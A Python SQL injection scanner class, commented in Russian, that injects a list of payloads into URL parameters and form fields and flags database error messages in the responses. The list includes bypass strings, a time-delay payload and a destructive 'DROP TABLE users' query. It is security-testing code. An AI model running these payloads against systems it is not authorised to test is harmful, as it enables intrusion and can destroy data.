import requests
import logging
from urllib.parse import urlparse, parse_qs, quote

logger = logging.getLogger(__name__)

class SQLiScanner:
    def __init__(self, session=None):
        self.session = session if session else requests.Session()
        self.payloads = [
            "'",
            "' OR '1'='1",
            "' OR 1=1 --",
            '" OR "" = "',
            "') OR ('1'='1--",
            "1; DROP TABLE users--",
            "1' WAITFOR DELAY '0:0:10'--",
            "1 OR 1=1"
        ]
        self.error_patterns = [
            "SQL syntax",
            "MySQL server",
            "ORA-",
            "syntax error",
            "unclosed quotation",
            "JDBC exception"
        ]

    def scan(self, url, forms=None):
        vulnerabilities = []
        
        # Проверка URL параметров
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if params:
            for param in params:
                for payload in self.payloads:
                    try:
                        test_url = self._inject_payload(url, param, payload)
                        response = self.session.get(test_url, timeout=5)
                        
                        if self._is_vulnerable(response.text):
                            vulnerabilities.append({
                                'type': 'SQL Injection',
                                'url': test_url,
                                'payload': payload,
                                'evidence': self._extract_error(response.text),
                                'severity': 'critical',
                                'param': param
                            })
                    except Exception as e:
                        logger.error(f"SQLi GET scan error for {url}: {str(e)}")

        # Проверка POST-форм
        if forms:
            for form in forms:
                for field in form.get('inputs', []):
                    for payload in self.payloads:
                        try:
                            test_data = {**form['data']}
                            test_data[field] = f"{test_data.get(field, '')}{payload}"
                            
                            response = self.session.post(
                                form['action'],
                                data=test_data,
                                timeout=5
                            )
                            
                            if self._is_vulnerable(response.text):
                                vulnerabilities.append({
                                    'type': 'SQL Injection',
                                    'url': form['action'],
                                    'payload': payload,
                                    'evidence': self._extract_error(response.text),
                                    'severity': 'critical',
                                    'param': field
                                })
                        except Exception as e:
                            logger.error(f"SQLi POST scan error for {url}: {str(e)}")

        return vulnerabilities

    def _inject_payload(self, url, param, payload):
        """Внедряет payload в URL параметр"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        original_value = query[param][0]
        query[param][0] = original_value + payload
        new_query = '&'.join(f"{k}={quote(v[0])}" for k, v in query.items())
        return parsed._replace(query=new_query).geturl()

    def _is_vulnerable(self, response_text):
        """Проверяет ответ на признаки уязвимости"""
        return any(error in response_text for error in self.error_patterns)

    def _extract_error(self, text):
        """Извлекает SQL ошибку из текста"""
        for pattern in self.error_patterns:
            if pattern in text:
                return pattern
        return "Error pattern not found"